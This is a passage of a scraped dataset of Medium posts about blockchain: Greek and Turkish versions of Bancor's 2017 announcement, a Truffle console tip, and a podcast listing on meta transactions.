\u03b4\u03b9\u03ba\u03c4\u03c5\u03b1\u03ba\u03ac \u03bc\u03b9\u03b1 \u03c6\u03c9\u03c4\u03bf\u03b3\u03c1\u03b1\u03c6\u03af\u03b1 \u03c3\u03b5 \u03ba\u03ac\u03c0\u03bf\u03b9\u03bf\u03bd, \u03c4\u03cc\u03c4\u03b5 \u03ad\u03c7\u03b5\u03c4\u03b5 \u03ba\u03b1\u03b9 \u03b5\u03c3\u03b5\u03af\u03c2 \u03ba\u03b1\u03b9 \u03bf \u03ac\u03bb\u03bb\u03bf\u03c2 \u03ad\u03bd\u03b1 \u03b1\u03bd\u03c4\u03af\u03b3\u03c1\u03b1\u03c6\u03bf \u03c4\u03b7\u03c2 \u03c6\u03c9\u03c4\u03bf\u03b3\u03c1\u03b1\u03c6\u03af\u03b1\u03c2), \u03b7 \u03b1\u03be\u03af\u03b1 \u03cc\u03bc\u03c9\u03c2 \u03b4\u03b5\u03bd \u03bc\u03c0\u03bf\u03c1\u03b5\u03af \u03bd\u03b1 \u03b1\u03bd\u03b1\u03c0\u03b1\u03c1\u03b1\u03c7\u03b8\u03b5\u03af (\u03cc\u03c4\u03b1\u03bd \u03b4\u03af\u03bd\u03b5\u03c4\u03b5 \u03b3\u03b9\u03b1 \u03c0\u03b1\u03c1\u03ac\u03b4\u03b5\u03b9\u03b3\u03bc\u03b1 \u03ad\u03bd\u03b1 \u03ba\u03ad\u03c1\u03bc\u03b1 \u03c3\u03b5 \u03ba\u03ac\u03c0\u03bf\u03b9\u03bf\u03bd, \u03c0\u03bb\u03ad\u03bf\u03bd \u03b4\u03b5\u03bd \u03c4\u03bf \u03ad\u03c7\u03b5\u03c4\u03b5 \u03b5\u03c3\u03b5\u03af\u03c2 \u03c3\u03b1\u03bd \u03b1\u03bd\u03c4\u03af\u03b3\u03c1\u03b1\u03c6\u03bf, \u03cc\u03c0\u03c9\u03c2 \u03bc\u03b9\u03b1 \u03c6\u03c9\u03c4\u03bf\u03b3\u03c1\u03b1\u03c6\u03af\u03b1).\u03a0\u03c1\u03b9\u03bd \u03c4\u03bf \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03bf, \u03c5\u03c0\u03ae\u03c1\u03c7\u03b1\u03bd \u03c0\u03bf\u03bb\u03bb\u03ac \u03b9\u03b4\u03b9\u03c9\u03c4\u03b9\u03ba\u03ac \u03b4\u03af\u03ba\u03c4\u03c5\u03b1 \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03cc\u03c1\u03b7\u03c3\u03b7\u03c2, \u03c4\u03b1 \u03bf\u03c0\u03bf\u03af\u03b1 \u03ba\u03ac\u03c0\u03bf\u03b9\u03bf\u03b9 \u03b1\u03c0\u03cc \u03b5\u03bc\u03ac\u03c2 \u03b8\u03c5\u03bc\u03cc\u03bc\u03b1\u03c3\u03c4\u03b5, \u03cc\u03c0\u03c9\u03c2 \u03c4\u03b1 BBS, Prodigy, Compuserve, AoL, \u03b3\u03b9\u03b1 \u03bd\u03b1 \u03b1\u03bd\u03b1\u03c6\u03ad\u03c1\u03bf\u03c5\u03bc\u03b5 \u03bc\u03b5\u03c1\u03b9\u03ba\u03ac. \u039c\u03b5 \u03c4\u03b7\u03bd \u03c7\u03c1\u03ae\u03c3\u03b7 \u03c4\u03bf\u03c5 \u03b4\u03b7\u03bc\u03cc\u03c3\u03b9\u03bf\u03c5 \u03b4\u03b9\u03b1\u03b4\u03b9\u03ba\u03c4\u03cd\u03bf\u03c5 \u03ac\u03bb\u03bb\u03b1\u03be\u03b1\u03bd \u03c4\u03b1 \u03c0\u03ac\u03bd\u03c4\u03b1, \u03ba\u03b1\u03b9 \u03c4\u03b1 \u03b9\u03b4\u03b9\u03c9\u03c4\u03b9\u03ba\u03ac \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03b1 \u03c5\u03b9\u03bf\u03b8\u03ad\u03c4\u03b7\u03c3\u03b1\u03bd \u03c0\u03bb\u03ad\u03bf\u03bd \u03ad\u03bd\u03b1 \u03bd\u03ad\u03bf \u03b1\u03bd\u03bf\u03b9\u03c7\u03c4\u03cc, \u03c0\u03b1\u03b3\u03ba\u03cc\u03c3\u03bc\u03b9\u03bf \u03c0\u03c1\u03cc\u03c4\u03c5\u03c0\u03bf \u03b1\u03bd\u03c4\u03b1\u03bb\u03bb\u03b1\u03b3\u03ae\u03c2 \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03bf\u03c1\u03b9\u03ce\u03bd, \u03c4\u03bf \u03bf\u03c0\u03bf\u03af\u03bf \u03b2\u03b1\u03c3\u03af\u03b6\u03b5\u03c4\u03b1\u03b9 \u03c3\u03b5 \u03bc\u03b9\u03b1 \u03c3\u03c5\u03bb\u03bb\u03bf\u03b3\u03ae \u03b4\u03b9\u03ba\u03c4\u03cd\u03c9\u03bd TCP / IP, \u03c0\u03bf\u03c5 \u03bf\u03c5\u03c3\u03b9\u03b1\u03c3\u03c4\u03b9\u03ba\u03ac \u03b4\u03b9\u03b1\u03c3\u03c5\u03bd\u03b4\u03ad\u03bf\u03bd\u03c4\u03b1\u03b9 \u03ba\u03b1\u03b9 \u00ab\u03b1\u03bd\u03c4\u03b1\u03bb\u03bb\u03ac\u03c3\u03c3\u03bf\u03c5\u03bd\u00bb \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03bf\u03c1\u03af\u03b5\u03c2.\u03a0\u03c1\u03b9\u03bd \u03c4\u03bf \u0392lockchain, \u03cc\u03bb\u03b1 \u03c4\u03b1 \u03bd\u03bf\u03bc\u03af\u03c3\u03bc\u03b1\u03c4\u03b1, \u03c0\u03bf\u03c5 \u03b1\u03bd\u03c4\u03b9\u03c0\u03c1\u03bf\u03c3\u03ce\u03c0\u03b5\u03c5\u03b1\u03bd \u03b1\u03be\u03af\u03b1, \u03bb\u03b5\u03b9\u03c4\u03bf\u03c5\u03c1\u03b3\u03bf\u03cd\u03c3\u03b1\u03bd \u03c3\u03b5 \u03ba\u03bb\u03b5\u03b9\u03c3\u03c4\u03ac \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03b9\u03b1. \u03a4\u03bf Blockchain \u03cc\u03bc\u03c9\u03c2 \u03ba\u03b1\u03b9 \u03b7 \u03c0\u03c1\u03c9\u03c4\u03bf\u03c0\u03bf\u03c1\u03b9\u03b1\u03ba\u03ae \u03c4\u03b5\u03c7\u03bd\u03bf\u03bb\u03bf\u03b3\u03af\u03b1 \u03c4\u03bf\u03c5 Bitcoin, \u03b5\u03af\u03bd\u03b1\u03b9 \u03ad\u03bd\u03b1 \u03b1\u03c0\u03bf\u03ba\u03b5\u03bd\u03c4\u03c1\u03c9\u03bc\u03ad\u03bd\u03bf \u03ba\u03b1\u03b9 \u03b1\u03bd\u03bf\u03b9\u03c7\u03c4\u03cc \u03b4\u03af\u03ba\u03c4\u03c5\u03bf \u03b1\u03bd\u03c4\u03b1\u03bb\u03bb\u03b1\u03b3\u03ae\u03c2 \u03b1\u03be\u03b9\u03ce\u03bd \u03ba\u03b1\u03b9 \u03c7\u03c1\u03b7\u03bc\u03ac\u03c4\u03c9\u03bd. \u0391\u03c5\u03c4\u03ae \u03b7 \u03c4\u03b5\u03c7\u03bd\u03bf\u03bb\u03bf\u03b3\u03af\u03b1 \u03b8\u03b1 \u03b1\u03bd\u03c4\u03b9\u03ba\u03b1\u03c4\u03b1\u03c3\u03c4\u03ae\u03c3\u03b5\u03b9 \u03ad\u03bd\u03b1 \u03bc\u03b5\u03b3\u03ac\u03bb\u03bf \u03bc\u03ad\u03c1\u03bf\u03c2 \u03c4\u03c9\u03bd \u03c3\u03b7\u03bc\u03b5\u03c1\u03b9\u03bd\u03ce\u03bd \u03b9\u03b4\u03b9\u03c9\u03c4\u03b9\u03ba\u03ce\u03bd \u03c4\u03c1\u03b1\u03c0\u03b5\u03b6\u03b9\u03ba\u03ce\u03bd \u03b4\u03b9\u03ba\u03c4\u03cd\u03c9\u03bd \u03ba\u03b1\u03b9 \u03b8\u03b1 \u03b5\u03c0\u03b9\u03c4\u03c1\u03ad\u03c8\u03b5\u03b9 \u03c3\u03c4\u03bf\u03bd \u03ba\u03ac\u03b8\u03b5 \u03ad\u03bd\u03b1 \u03b1\u03c0\u03cc \u03b5\u03bc\u03ac\u03c2 \u03bd\u03b1 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03ae\u03c3\u03b5\u03b9 \u03bd\u03ad\u03bf\u03c5\u03c2 \u03c4\u03cd\u03c0\u03bf\u03c5\u03c2 \u03b1\u03be\u03af\u03b1\u03c2 \u03c0\u03bf\u03c5 \u03b8\u03b1 \u03c3\u03c5\u03bd\u03b1\u03bb\u03bb\u03ac\u03c3\u03c3\u03bf\u03bd\u03c4\u03b1\u03b9 \u03c3\u03b5 \u03ad\u03bd\u03b1 \u03b1\u03bd\u03bf\u03b9\u03c7\u03c4\u03cc \u03ba\u03b1\u03b9 \u03c0\u03b1\u03b3\u03ba\u03cc\u03c3\u03bc\u03b9\u03bf \u03c3\u03cd\u03c3\u03c4\u03b7\u03bc\u03b1 \u03c0\u03bf\u03c5 \u03b4\u03b5\u03bd \u03b8\u03b1 \u03b1\u03bd\u03ae\u03ba\u03b5\u03b9 \u03c3\u03b5 \u03ba\u03b1\u03bd\u03ad\u03bd\u03b1\u03bd.\u0397 \u03bf\u03bc\u03ac\u03b4\u03b1 \u03c0\u03af\u03c3\u03c9 \u03b1\u03c0\u03cc \u03c4\u03bf Bancor \u03ba\u03b9\u03bd\u03b5\u03af\u03c4\u03b5 \u03c3\u03c4\u03bf\u03bd \u03c7\u03ce\u03c1\u03bf \u03c4\u03bf\u03c5 \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03bf \u03b1\u03c0\u03cc \u03c4\u03b1 \u03c4\u03ad\u03bb\u03b7 \u03c4\u03b7\u03c2 \u03b4\u03b5\u03ba\u03b1\u03b5\u03c4\u03af\u03b1\u03c2 \u03c4\u03bf\u03c5 \u201990. \u039f\u03c1\u03b9\u03c3\u03bc\u03ad\u03bd\u03b5\u03c2 \u03b1\u03c0\u03cc \u03c4\u03b9\u03c2 \u03b5\u03c4\u03b1\u03b9\u03c1\u03b5\u03af\u03b5\u03c2 \u03bc\u03b1\u03c2 \u03b5\u03af\u03bd\u03b1\u03b9 \u03b7 MetaCafe, Mytopia, Particle Code \u03ba\u03b1\u03b9 AppCoin. \u039c\u03c0\u03ae\u03ba\u03b1\u03bc\u03b5 \u03c3\u03c4\u03bf \u03c7\u03ce\u03c1\u03bf \u03c4\u03bf\u03c5 Bitcoin \u03c4\u03bf 2011 \u03ba\u03b1\u03b9 \u03b1\u03c1\u03c7\u03af\u03c3\u03b1\u03bc\u03b5 \u03bd\u03b1 \u03b4\u03b9\u03b5\u03c1\u03b5\u03c5\u03bd\u03bf\u03cd\u03bc\u03b5 \u03c4\u03b1 \u03c8\u03b7\u03c6\u03b9\u03b1\u03ba\u03ac \u03bd\u03bf\u03bc\u03af\u03c3\u03bc\u03b1\u03c4\u03b1 \u03ba\u03b1\u03b9 \u03c4\u03b7\u03c2 \u03b4\u03c5\u03bd\u03b1\u03c4\u03cc\u03c4\u03b7\u03c4\u03b5\u03c2 \u03c0\u03bf\u03c5 \u03c0\u03b1\u03c1\u03ad\u03c7\u03bf\u03c5\u03bd \u03c3\u03c4\u03bf\u03c5\u03c2 \u03c7\u03c1\u03ae\u03c3\u03c4\u03b5\u03c2. \u039c\u03b5 \u03c4\u03b7\u03bd \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03af\u03b1 \u03c4\u03bf\u03c5 Ethereum \u03c4\u03bf 2015, \u03ba\u03b1\u03c4\u03b1\u03bd\u03bf\u03ae\u03c3\u03b1\u03bc\u03b5 \u03cc\u03c4\u03b9 \u03c4\u03b1 \u03ad\u03be\u03c5\u03c0\u03bd\u03b1 \u03c3\u03c5\u03bc\u03b2\u03cc\u03bb\u03b1\u03b9\u03b1 \u03b5\u03af\u03bd\u03b1\u03b9 \u03bc\u03b9\u03b1 \u03c3\u03b7\u03bc\u03b9\u03c4\u03b9\u03ba\u03ae \u03ba\u03b1\u03b9\u03bd\u03bf\u03c4\u03bf\u03bc\u03af\u03b1 \u03c0\u03bf\u03c5 \u03b8\u03b1 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03ae\u03c3\u03b5\u03b9 \u03b5\u03c0\u03b9\u03c0\u03bb\u03ad\u03bf\u03bd \u03ba\u03b1\u03b9\u03bd\u03bf\u03c4\u03bf\u03bc\u03af\u03b5\u03c2 \u03c3\u03c4\u03bf\u03bd \u03c7\u03ce\u03c1\u03bf \u03c4\u03bf\u03c5 Blockchain. \u03a0\u03c1\u03bf\u03b3\u03c1\u03ac\u03bc\u03bc\u03b1\u03c4\u03b1 \u03c0\u03bf\u03c5 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03bf\u03cd\u03bd \u03c8\u03b7\u03c6\u03b9\u03b1\u03ba\u03ad\u03c2 \u03bc\u03ac\u03c1\u03ba\u03b5\u03c2 (\u03c0\u03bf\u03c5 \u03b1\u03bd\u03c4\u03b9\u03c0\u03c1\u03bf\u03c3\u03c9\u03c0\u03b5\u03cd\u03bf\u03c5\u03bd \u03b1\u03be\u03af\u03b1) \u03bc\u03c0\u03bf\u03c1\u03bf\u03cd\u03bd \u03bd\u03b1 \u03b5\u03ba\u03c4\u03b5\u03bb\u03bf\u03cd\u03bd \u03bf\u03b9\u03ba\u03bf\u03bd\u03bf\u03bc\u03b9\u03ba\u03ad\u03c2 \u03b4\u03b9\u03b1\u03b4\u03b9\u03ba\u03b1\u03c3\u03af\u03b5\u03c2 \u03b3\u03b9\u03b1 \u03c7\u03b1\u03bc\u03b7\u03bb\u03cc\u03c4\u03b5\u03c1\u03bf \u03ba\u03cc\u03c3\u03c4\u03bf\u03c2, \u03c4\u03b9\u03c2 \u03bf\u03c0\u03bf\u03af\u03b5\u03c2 \u03c3\u03ae\u03bc\u03b5\u03c1\u03b1 \u03c7\u03b5\u03b9\u03c1\u03af\u03b6\u03bf\u03bd\u03c4\u03b1\u03b9 \u03b4\u03b9\u03ac\u03c6\u03bf\u03c1\u03bf\u03b9 \u03bf\u03c1\u03b3\u03b1\u03bd\u03b9\u03c3\u03bc\u03bf\u03af (\u03c0.\u03c7. \u03c5\u03c0\u03b7\u03c1\u03b5\u03c3\u03af\u03b5\u03c2 \u03bc\u03b5\u03c3\u03b5\u03b3\u03b3\u03cd\u03b7\u03c3\u03b7\u03c2, \u03b4\u03b9\u03ba\u03b7\u03b3\u03bf\u03c1\u03b9\u03ba\u03ad\u03c2 \u03b5\u03c4\u03b1\u03b9\u03c1\u03b5\u03af\u03b5\u03c2 \u03ba\u03c4\u03bb.). \u03a9\u03c3\u03c4\u03cc\u03c3\u03bf, \u03bf\u03b9 \u03b4\u03c5\u03bd\u03b1\u03c4\u03cc\u03c4\u03b7\u03c4\u03b5\u03c2 \u03bc\u03b9\u03b1\u03c2 \u03b1\u03c5\u03c4\u03cc\u03bd\u03bf\u03bc\u03b7\u03c2 \u03c0\u03bb\u03b1\u03c4\u03c6\u03cc\u03c1\u03bc\u03b1\u03c2 \u03c0\u03bf\u03c5 \u03bc\u03c0\u03bf\u03c1\u03b5\u03af \u03bd\u03b1 \u03b4\u03b9\u03b1\u03c7\u03b5\u03b9\u03c1\u03b9\u03c3\u03c4\u03b5\u03af \u03b1\u03c5\u03c4\u03ac \u03c4\u03b1 \u03c8\u03b7\u03c6\u03b9\u03b1\u03ba\u03ac \u03c7\u03c1\u03ae\u03bc\u03b1\u03c4\u03b1 \u03c3\u03b5 \u03ad\u03bd\u03b1 \u03b1\u03bd\u03bf\u03b9\u03ba\u03c4\u03cc \u03c0\u03c1\u03cc\u03c4\u03c5\u03c0\u03bf \u03b3\u03b9\u03b1 \u03c4\u03b7\u03bd \u03b1\u03bd\u03c4\u03b1\u03bb\u03bb\u03b1\u03b3\u03ae \u03b1\u03be\u03b9\u03ce\u03bd \u03b5\u03af\u03bd\u03b1\u03b9 \u03ba\u03ac\u03c4\u03b9 \u03c0\u03bf\u03c5 \u03c9\u03c2 \u03c3\u03ae\u03bc\u03b5\u03c1\u03b1 \u03b4\u03b5\u03bd \u03ae\u03c4\u03b1\u03bd \u03b4\u03c5\u03bd\u03b1\u03c4\u03cc.\u03a4\u03bf \u03ba\u03b1\u03bb\u03bf\u03ba\u03b1\u03af\u03c1\u03b9 \u03c4\u03bf\u03c5 2016 \u03be\u03b5\u03ba\u03b9\u03bd\u03ae\u03c3\u03b1\u03bc\u03b5 \u03bd\u03b1 \u03b4\u03bf\u03c5\u03bb\u03b5\u03cd\u03bf\u03c5\u03bc\u03b5 \u03c3\u03c4\u03bf \u03c3\u03c7\u03ad\u03b4\u03b9\u03bf \u03bc\u03b1\u03c2 \u03c0\u03bf\u03c5 \u03c4\u03bf \u03bf\u03bd\u03bf\u03bc\u03ac\u03c3\u03b1\u03bc\u03b5 Bancor \u03bc\u03b5 \u03c3\u03c4\u03cc\u03c7\u03bf \u03c4\u03b7 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03af\u03b1 \u03b5\u03bd\u03cc\u03c2 \u03b9\u03b5\u03c1\u03b1\u03c1\u03c7\u03b9\u03ba\u03bf\u03cd \u03bd\u03bf\u03bc\u03b9\u03c3\u03bc\u03b1\u03c4\u03b9\u03ba\u03bf\u03cd \u03c3\u03c5\u03c3\u03c4\u03ae\u03bc\u03b1\u03c4\u03bf\u03c2 (\u03cc\u03c0\u03bf\u03c5 \u03bc\u03b9\u03b1 \u03c8\u03b7\u03c6\u03b9\u03b1\u03ba\u03ae \u03bc\u03ac\u03c1\u03ba\u03b1, \u03c0\u03b1\u03c1\u03ad\u03c7\u03b5\u03b9 \u03ba\u03b1\u03b9 \u03ac\u03bb\u03bb\u03b5\u03c2 \u03bc\u03ac\u03c1\u03ba\u03b5\u03c2 \u03c3\u03c4\u03bf \u03b1\u03c0\u03bf\u03b8\u03b5\u03bc\u03b1\u03c4\u03b9\u03ba\u03cc \u03c4\u03b7\u03c2 \u03c4\u03b1\u03bc\u03b5\u03af\u03bf) \u03b3\u03b9\u03b1 \u03c4\u03b7\u03bd \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03af\u03b1 \u03b5\u03bd\u03cc\u03c2 \u03bd\u03ad\u03bf\u03c5 \u03c0\u03c1\u03bf\u03c4\u03cd\u03c0\u03bf\u03c5 \u03ba\u03c1\u03c5\u03c0\u03c4\u03bf\u03c3\u03c5\u03c7\u03bd\u03bf\u03c4\u03ae\u03c4\u03c9\u03bd \u03c0\u03bf\u03c5 \u03b8\u03b1 \u03b8\u03ad\u03c3\u03b5\u03b9 \u03c4\u03b7\u03c2 \u03b2\u03ac\u03c3\u03b5\u03b9\u03c2 \u03b3\u03b9\u03b1 \u03bc\u03b9\u03b1 \u03b1\u03c0\u03bf\u03ba\u03b5\u03bd\u03c4\u03c1\u03c9\u03bc\u03ad\u03bd\u03b7 \u03c0\u03bb\u03b1\u03c4\u03c6\u03cc\u03c1\u03bc\u03b1 \u03c0\u03b1\u03b3\u03ba\u03cc\u03c3\u03bc\u03b9\u03b1\u03c2 \u03c3\u03c5\u03bd\u03b1\u03bb\u03bb\u03b1\u03b3\u03ae\u03c2. \u0388\u03bd\u03b1 \u03b1\u03c5\u03c4\u03cc\u03bd\u03bf\u03bc\u03bf \u03c3\u03cd\u03c3\u03c4\u03b7\u03bc\u03b1, \u03c7\u03c9\u03c1\u03af\u03c2 \u03ba\u03b9\u03bd\u03b4\u03cd\u03bd\u03bf\u03c5\u03c2, \u03c0\u03bf\u03c5 \u03c0\u03b1\u03c1\u03ad\u03c7\u03b5\u03b9 \u03c3\u03c5\u03bd\u03b5\u03c7\u03ae \u03c1\u03b5\u03c5\u03c3\u03c4\u03cc\u03c4\u03b7\u03c4\u03b1 \u03b3\u03b9\u03b1 \u03bf\u03c0\u03bf\u03b9\u03bf\u03b4\u03ae\u03c0\u03bf\u03c4\u03b5 \u03c0\u03b5\u03c1\u03b9\u03bf\u03c5\u03c3\u03b9\u03b1\u03ba\u03cc \u03c3\u03c4\u03bf\u03b9\u03c7\u03b5\u03af\u03bf. \u0391\u03c5\u03c4\u03cc \u03c0\u03bf\u03c5 \u03b5\u03c0\u03b9\u03c4\u03c1\u03ad\u03c0\u03b5\u03b9 \u03c4\u03b7 \u03bb\u03b5\u03b3\u03cc\u03bc\u03b5\u03bd\u03b7 \u00ab\u03bc\u03b1\u03ba\u03c1\u03ac \u03bf\u03c5\u03c1\u03ac\u00bb (long tail) \u03c4\u03c9\u03bd \u03bd\u03bf\u03bc\u03b9\u03c3\u03bc\u03ac\u03c4\u03c9\u03bd \u03c0\u03bf\u03c5 \u03b8\u03b1 \u03b4\u03b7\u03bc\u03b9\u03bf\u03c5\u03c1\u03b3\u03ae\u03c3\u03b5\u03b9 \u03b1\u03be\u03af\u03b1, \u03cc\u03c0\u03c9\u03c2 \u03b1\u03ba\u03c1\u03b9\u03b2\u03ce\u03c2 \u03c3\u03c5\u03bd\u03ad\u03b2\u03b7 \u03ba\u03b1\u03b9 \u03bc\u03b5 \u03c4\u03bf \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03bf.\u0398\u03b1 \u03b8\u03ad\u03bb\u03b1\u03bc\u03b5 \u03bd\u03b1 \u03bc\u03bf\u03b9\u03c1\u03b1\u03c3\u03c4\u03bf\u03cd\u03bc\u03b5 \u03bc\u03b1\u03b6\u03af \u03c3\u03b1\u03c2, \u03c4\u03bf \u03b4\u03b9\u03b1\u03b4\u03af\u03ba\u03c4\u03c5\u03bf, \u03ba\u03b1\u03b9 \u03c4\u03bf \u03c3\u03c7\u03ad\u03b4\u03b9\u03bf \u03bc\u03b1\u03c2. \u03a0\u03b5\u03c1\u03b9\u03bc\u03b5\u03bd\u03bf\u03c5\u03bc\u03b5 \u03c4\u03b7\u03bd \u03ba\u03c1\u03b9\u03c4\u03b9\u03ba\u03ae \u03ba\u03b1\u03b9 \u03c4\u03b1 \u03c3\u03c7\u03cc\u03bb\u03b9\u03ac \u03c3\u03b1\u03c2. \u03a4\u03bf \u03ba\u03b1\u03b8\u03b5 \u03c3\u03c7\u03cc\u03bb\u03b9\u03bf \u03b5\u03af\u03bd\u03b1\u03b9 \u03b5\u03c5\u03c0\u03c1\u03cc\u03c3\u03b4\u03b5\u03ba\u03c4\u03bf.\u0397 \u03bf\u03bc\u03ac\u03b4\u03b1 Bancorhttp://bancor.network", "responses": ""}, {"title": "Bancor Protokol\u00fc", "author_name": "Bancor", "link": "https://medium.com/bancor-protokol%C3%BC/bancor-protokol%C3%BC-7a3ea8cd5f45?source=search_post", "post_date": "Jul 13, 2017", "readtime": "2 min read", "upvotes": "", "content": "Bancor Protokol\u00fcBancorBlockedUnblockFollowFollowingJul 13, 2017Merhaba D\u00fcnya, Bizler Bancor Protokol\u00fcn\u00fcn (PDF) ard\u0131ndaki ekibiz ve blokzincir \u00fczerinde merkezsiz, hiyerar\u015fik bir para sistemi olu\u015fturuyoruz.\u0130nsanlar aras\u0131ndaki de\u011fi\u015fim/takas d\u00fcnyas\u0131na bakt\u0131\u011f\u0131m\u0131zda, payla\u015ft\u0131\u011f\u0131m\u0131z ve ticarette bulunan iki ana kategori g\u00f6r\u00fcyoruz\u200a\u2014\u200aBilgi ve De\u011fer. Bilgiler (resimler, metinler, video vb. gibi i\u00e7erik) do\u011fas\u0131 gere\u011fi yinelenen olsa da (siz onu payla\u015ft\u0131\u011f\u0131n\u0131zda siz ve bir ba\u015fkas\u0131 da sahibi olur), de\u011fer b\u00f6yle de\u011fildir (onu birisine verince, art\u0131k sahibi siz de\u011filsiniz.)\u0130nternet \u00e7a\u011f\u0131ndan \u00f6nce, yeterince ya\u015fl\u0131 olan hat\u0131rlayacakt\u0131r, bir\u00e7ok \u00f6zel bilgi a\u011f\u0131 vard\u0131 bunlardan baz\u0131lar\u0131; BBS, Prodigy, Compuserve, AoL ve birka\u00e7 tanesi daha. Halka a\u00e7\u0131k \u0130nternet\u2019in y\u00fckseli\u015fi her \u015feyi de\u011fi\u015ftirdi ve bunlar\u0131n i\u00e7inden kar\u015f\u0131l\u0131kl\u0131 anla\u015fmalar yoluyla birbirine ba\u011fl\u0131 TCP/IP a\u011flar\u0131na dayanan bilgi al\u0131\u015fveri\u015finde k\u00fcresel standarda adapte olabilenler hayatta kald\u0131.Blokzincir\u2019e kadar, de\u011feri temsil eden t\u00fcm para birimleri, kapal\u0131 silolarda ya\u015f\u0131yordu. Bitcoin\u2019in \u00f6nc\u00fcl\u00fc\u011f\u00fcnde getirilen Blokzincir teknolojisi, merkezsiz bir de\u011fer de\u011fi\u015fim/takas a\u011f\u0131, \u0130nternet\u2019in paras\u0131. G\u00fcn\u00fcm\u00fcz\u00fcn \u00f6zel bankac\u0131l\u0131k a\u011flar\u0131n\u0131n b\u00fcy\u00fck bir b\u00f6l\u00fcm\u00fcn\u00fcn yerini alacak ve kimsenin sahip olmad\u0131\u011f\u0131, k\u00fcresel bir sistemde yeni de\u011ferler yaratacak ve a\u00e7\u0131k bir \u015fekilde i\u015flem yapacak yeni oyunculara (adapte olabilen eskilere de) imk\u00e2n verecektir.Bancor ekibi, 90'l\u0131 y\u0131llar\u0131n sonlar\u0131ndan beri \u0130nternet\u2019te \u00fcr\u00fcnler geli\u015ftiriyor. Firmalar\u0131m\u0131z\u0131n baz\u0131lar\u0131; Contact Networks, MetaCafe, Mytopia, Particle Code ve AppCoin\u2019dir. 2011'de Bitcoin\u2019e girdik ve kullan\u0131c\u0131 taraf\u0131ndan \u00fcretilen para birimlerindeki olanaklar\u0131 ara\u015ft\u0131rmaya ba\u015flad\u0131k. Ethereum\u2019un 2015 y\u0131l\u0131nda piyasaya s\u00fcr\u00fclmesinin ard\u0131ndan ak\u0131ll\u0131 s\u00f6zle\u015fmelerin bir oyun de\u011fi\u015ftirici oldu\u011funu ve para birimi olu\u015fturulmas\u0131na ve \u00f6zelle\u015ftirilmesine imk\u00e2n verdi\u011fini anlad\u0131k. De\u011fer y\u00f6neten ve tutan programlanabilir mod\u00fcller, (token olarak temsil ediliyor) \u015fu anda \u00e7e\u015fitli kurulu\u015flar (\u00f6rne\u011fin, garant\u00f6r (escrow) hizmetleri, borsalar, hukuk firmalar\u0131 ve birka\u00e7 tane daha) taraf\u0131ndan ele al\u0131nan \u00f6nemsiz maliyet s\u00fcre\u00e7leri i\u00e7in de\u011fer ile ilgili i\u015flemleri ger\u00e7ekle\u015ftirebilir. Bununla birlikte, de\u011fer de\u011fi\u015fiminde a\u00e7\u0131k bir standart \u00fczerinde dijital para idare edebilen otonom merkezsiz kodun sonu\u00e7lar\u0131 \u00e7ok daha derindir.2016 yaz\u0131nda, merkezsiz bir k\u00fcresel borsan\u0131n temelini atacak kriptoparalar i\u00e7in yeni bir standart t\u00fcr\u00fcn\u00fc olu\u015fturmak \u00fczere hiyerar\u015fik bir para sistemi (Burada bir dijital token, di\u011fer tokenleri kendi rezervinde tutar) olu\u015fturmak amac\u0131yla Bancor \u00fczerinde \u00e7al\u0131\u015fmaya ba\u015flad\u0131k. Otonom olan, makas fark\u0131 olmayan, kar\u015f\u0131 taraf riski bulunmayan ve herhangi bir asset i\u00e7in s\u00fcrekli likidite sa\u011flayan bir sistem. \u0130\u00e7erik i\u00e7in internetin yapt\u0131\u011f\u0131 gibi, para birimlerinin long-tail\u2019ini olanak tan\u0131yan bir sistem.\u0130ncelemeniz ve yorumlar\u0131n\u0131z i\u00e7in whitepaper tasla\u011f\u0131n\u0131 sizlerle payla\u015fmak istiyoruz. T\u00fcm geri bildirimlere a\u00e7\u0131\u011f\u0131z.Bancor Ekibihttp://bancor.network", "responses": ""}, {"title": "", "author_name": "Gaurav Agrawal", "link": "https://medium.com/@gaurav.agrawal/for-those-who-are-getting-some-sort-of-error-while-using-truffle-migrate-8f5f87310ca9?source=search_post", "post_date": "Sep 27, 2018", "readtime": "", "upvotes": "1", "content": "Gaurav AgrawalBlockedUnblockFollowFollowingSep 27, 2018For those who are getting some sort of error while using \u201ctruffle migrate\u201d. On Truffle Console you don\u2019t need to use Truffle as prefix in your commands. Just hit \u201cmigrate\u201d and it will work.truffle console: SyntaxError: Unexpected identifier \u00b7 Issue #910 \u00b7 trufflesuite/truffleTruffle migrate is working good but while running truffle console SyntaxError: Unexpected identifier at new Script\u2026github.com", "responses": ""}, {"title": "#1\u200a\u2014\u200aAustin Griffith\u200a\u2014\u200aMeta Transactions", "author_name": "Gianni D\u2019Alerta", "link": "https://medium.com/tokenpoints/1-austin-griffith-meta-transactions-bda731ce587e?source=search_post", "post_date": "Oct 25, 2018", "readtime": "", "upvotes": "", "content": "#1\u200a\u2014\u200aAustin Griffith\u200a\u2014\u200aMeta TransactionsGianni D\u2019AlertaBlockedUnblockFollowFollowingOct 25, 2018In our first episode of Token Points our guest Austin Griffith talks about his journey into blockchain. How building games allowed him to learn about Ethereum and Solidity development. We discover how this journey led to obstacles in UX and how he is now dedicated his time for research in the fascinating space of meta transactions.Guest: Austin Griffith\u200a\u2014\u200atwitter.com/austingriffithWebsite: austingriffith.comYoutube: www.youtube.com/channel/UC_HI2i2peo1A-STdG22GFsAGithub: github.com/austintgriffithLinks mentioned in this episode:Gallaeas: galleass.ioCryptogs: cryptogs.ioMetaTx.io: MetaTx.ioToken Subscriptions: tokensubscription.comThis episode is also available on\u00a0:YouTube: https://www.youtube.com/watch?v=_8V7MtTzv2o&SoundCloud: 